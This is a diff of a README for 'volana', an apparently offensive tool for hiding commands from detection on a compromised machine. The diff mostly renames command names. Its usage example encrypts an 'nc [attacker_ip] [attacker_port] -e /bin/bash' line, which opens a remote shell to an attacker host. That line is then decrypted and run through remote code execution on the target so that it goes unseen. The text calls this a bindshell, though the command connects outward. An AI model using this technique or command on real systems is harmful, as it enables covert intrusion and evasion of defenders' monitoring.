@@ -39,20 +39,20 @@ Previously, you need to build `volana` with embedded encryption key.
 ## ATTACKER MACHINE
 
 ## Build volana with encryption key
-make build.volana-with-enc
+make build.volana-with-encryption
 
 ## Transfer it on TARGET (the unique detectable command)
 ## [...]
 
 ## Encrypt the command you want to stealthy execute
 ## (Here a nc bindshell to obtain a interactive shell)
-volana encrypt "nc [attacker_ip] [attacker_port] -e /bin/bash"
+volana encr "nc [attacker_ip] [attacker_port] -e /bin/bash"
 **encrypted cmd**
 ```
 
 Copy encrypted command and executed it with your rce **on target machine**
 ```shell
-./volana decrypt [encrypted_command]
+./volana decr [encrypted_command]
 ## Now you have a bindshell shell, spawn it to make it interactive and use volana normally)
 
 ```
